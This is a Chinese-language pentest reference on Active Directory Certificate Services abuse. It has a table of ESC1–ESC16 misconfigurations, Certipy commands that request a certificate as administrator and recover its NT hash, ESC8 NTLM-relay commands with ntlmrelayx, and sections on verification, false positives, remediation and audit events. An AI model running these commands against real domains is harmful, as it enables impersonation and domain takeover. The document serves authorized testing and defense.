# ADCS 滥用（ESC 系列）

> AD 证书服务（ADCS）把"证书 = 身份"引入 Windows 域。ESC 系列的核心是**模板/CA 配置允许攻击者获得可用于冒充他人的证书**，从而绕过口令与 MFA。

## 一、常见 ESC 分类

| 编号 | 问题 | 关键配置 |
|---|---|---|
| ESC1 | 模板允许请求者指定 SAN（`EnrolleeSuppliesSubject`）+ 客户端认证 EKU + 低权限可注册 | `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` |
| ESC2 | 模板可被用于任何用途（`Any Purpose` EKU 或无限 EKU） | 无 EKU 限制 |
| ESC3 | 证书申请代理（Enrollment Agent）模板可被滥用做 On-Behalf-Of 注册 | `Certificate Request Agent` EKU |
| ESC4 | 低权限用户对模板有写权限 → 改成 ESC1 配置 | 模板 ACL 可写 |
| ESC5 | PKI 相关对象（CA、NTAuthCertificates、容器）可被低权限修改 | AD 对象 ACL |
| ESC6 | CA 设置 `EDITF_ATTRIBUTESUBJECTALTNAME2` → 任意模板都能带任意 SAN | CA 策略标志 + 重启生效 |
| ESC7 | `ManageCA`/`ManageCertificates` 权限可批准被拒请求或改 CA 配置 | CA 角色权限 |
| ESC8 | CA 启用 HTTP 注册（Web Enrollment）→ 可被 NTLM 中继做证书注册 | Web 端点 + 未启用 EPA |
| ESC9 | 禁用 `szOID_NTDS_CA_SECURITY_EXT` 强映射检查 → 弱映射下改 UPN 冒充 | `StrongCertificateBindingEnforcement=0` |
| ESC10 | 同上，注册表弱映射弱检查组合 | `CertificateMappingMethods` |
| ESC11 | RPC 注册（ICertPassage）未强制加密 → 中继到 RPC | 接口加密未启用 |
| ESC13 | 模板与组链接的 OID（issuance policy）→ 自动获得组权限 | `msDS-OIDToGroupLink` |
| ESC14 | 弱映射 + 可写 `altSecurityIdentities` → 显式映射冒充 | 属性可写 |
| ESC15 | 模板 schema v1 可注入应用策略（EKU/Application Policy 滥用） | schema 版本 1 + 可注册 |
| ESC16 | CA 全局禁用安全扩展（`szOID_NTDS_CA_SECURITY_EXT`） | 全局禁用 |

> 编号随研究演进会扩展，取证时以**配置事实**（模板属性、CA 标志、ACL）为准，不要只背编号。

## 二、标准利用流程（ESC1 为例）

```bash
# 枚举（Certipy 或 Certify）
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
certipy req -u <user>@<domain> -p <pass> -ca <CA-NAME> -template <VULN-TEMPLATE> \
            -upn administrator@<domain> -target <CA-HOST>
certipy auth -pfx administrator.pfx -dc-ip <dc>
# 得到 NT 哈希或直接访问 LDAP/SMB
```

中继类（ESC8）：

```bash
certipy relay -ca <CA-HOST> -template DomainController        # 配合 PetitPotam/PrinterBug 触发
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

## 三、验证（最小证据）

1. 配置证据：模板/CA/ACL 的**实际属性**（`certipy find` 输出或 LDAP/注册表查询），证明脆弱条件成立。
2. 请求证据：成功签发的证书（PFX/PEM），且 SAN/UPN 是**他人/特权身份**。
3. 使用证据：用该证书获得的目标身份访问（如 `certipy auth` 返回的 NT 哈希，或 LDAP 上的身份）。
4. 不使用该证书做任何持久化或破坏性操作。

## 四、常见误报

- 模板存在但**请求被 CA 策略拒绝**（需管理器批准、需要发行策略）。
- 证书签发成功但强映射生效，`auth` 失败。
- 测试账号本身已在目标组中。
- Web 注册存在但启用了 EPA（Extended Protection for Authentication）→ ESC8 不成立。

## 五、修复

- 移除模板上的 `EnrolleeSuppliesSubject`；对特权模板要求 CA 管理器批准。
- 收紧模板与 PKI 对象 ACL；定期用 `certipy find` 做资产巡检。
- CA 关闭 `EDITF_ATTRIBUTESUBJECTALTNAME2`；禁用不需要的 Web/RPC 注册或启用 EPA/签名加密。
- 启用并强制**强证书映射**（`StrongCertificateBindingEnforcement=2`），保持安全扩展检查。
- 对 `altSecurityIdentities` 写入做监控；对低权限创建/修改证书模板告警。
- 监控事件：4886/4887（证书签发）、4898、CA 审计 4882。

## 六、参考

- SpecterOps：Certified Pre-Owned（ESC1-8 原始研究）
- 后续 ESC9-ESC16 相关研究（2023-2025）
- 工具：Certipy、Certify、ntlmrelayx（`--adcs`）
